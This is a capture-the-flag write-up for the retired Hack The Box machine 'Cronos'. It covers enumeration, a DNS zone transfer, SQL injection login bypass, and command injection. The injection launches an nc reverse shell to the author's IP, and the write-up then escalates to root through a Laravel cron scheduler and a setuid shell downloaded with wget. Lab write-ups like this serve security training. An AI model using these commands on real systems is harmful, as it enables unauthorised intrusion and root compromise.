# Cronos

This is the write-up for the box Cronos that got retired at the 5th August 2017.
My IP address was 10.10.14.8 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.13    cronos.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/cronos.nmap 10.10.10.13
```

```markdown
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the web page we see the Apache2 default page.
As this server has DNS open there will probably be _Virtual Host Routing_ active so lets visit the site with the hostname **cronos.htb**.

Now we see a real web page with this:

![Cronos web page](https://kyuu-ji.github.io/htb-write-up/cronos/cronos_web-page.png)

All the links have something to do with a software called **Laravel** which is a PHP framework.
As this won't help much we start _Gobuster_ to look for hidden paths on this site:
```markdown
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://cronos.htb/ 
```

We only get _/server-status_ but with a HTTP code 403 (Forbidden).

## Checking DNS (Port 53)

As the DNS service runs on TCP, which is unusual, we will check for _DNS Zone Transfer records_:
```markdown
dig axfr @10.10.10.13 cronos.htb
```
```markdown
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
```

The most interesting one is probably **admin.cronos.htb** so lets put the domains in the _Hosts_ file and browse there.
It gives us a login page:

![Cronos login page](https://kyuu-ji.github.io/htb-write-up/cronos/cronos_login-page.png)

### Exploiting the Login Page

After copying the request for the login page and saving it as a file (login.req) we try a SQL Injection with _SQLMap_ on this:
```markdown
sqlmap -r login.req 
```

Interesting output from SQLMap:
> sqlmap got a 302 redirect to 'http://admin.cronos.htb:80/welcome.php'. Do you want to follow? [Y/n]

> POST parameter 'username' is vulnerable.(...)

So lets try a basic SQL Injection on the username field:

![Cronos SQL Injection](https://kyuu-ji.github.io/htb-write-up/cronos/cronos_sqli.png)

And we are logged in and see this page:

![Cronos Welcome page](https://kyuu-ji.github.io/htb-write-up/cronos/cronos_welcome-page.png)

### Exploiting the Net Tool

This page executes the commands _traceroute_ and _ping_ from the system so lets try basic command injection by appending another command after a semicolon.
Appending `; whoami` on the input field gives us the output _www-data_ so we have command execution and will start a reverse shell that listens on my IP and port 9001:
```markdown
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 9001 >/tmp/f

# In the request and URL-encoded:
command=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.8+9001+>/tmp/f
```

And we have a reverse shell session on the box!

## Privilege Escalation

Uploading and starting the enumeration script **LinEnum.sh** and looking at the output we see a cronjob that we want to exploit.
> \* \* \* \* \*    root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

The cronjob runs a Laravel command every minute as root and this can get us command execution as root.
On the [Laravel documentation](https://laravel.com/docs/5.8/scheduling) we can see how the scheduled commands work and create our own commands.

First we need to find the file **Kernel.php**:
```markdown
find / -iname Kernel.php 2>/dev/null

/var/www/laravel/app/Console/Kernel.php
```

We will modify the schedule function in this file to create the file _test_ in the _/tmp_ directory:
```php
//(...)
    protected function schedule(Schedule $schedule)
    {
        $schedule->exec('touch /tmp/test')->everyMinute(); //The line we add
        // $schedule->command('inspire')
        //          ->hourly();
    }
//(...)
```

After on minute the command gets automatically executed and file got created with root permissions.
That means we can compile a TTY shell and execute it to start a session with root.

We create a file named **shell.c** with this content:
```c
int main(void)
{
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
```

And compile it:
```markdown
gcc shell.c -o shell
```

Now we need to upload this shell on the box and make it executable: 
```markdown
# Downloading the binary on the box
wget http://10.10.14.8:8000/shell

# Making it executable
chmod +x shell
```

And we need modify the _Kernel.php_ script to give it the setuid bit and change the owner to root, so it runs as root:
```php
//(...)
    protected function schedule(Schedule $schedule)
    {
        $schedule->exec('chown root:root /tmp/shell; chmod 4755 /tmp/shell')->everyMinute();
        // $schedule->command('inspire')
        //          ->hourly();
    }
//(...)
```

After one minute it runs and we can run the binary and get a root shell!
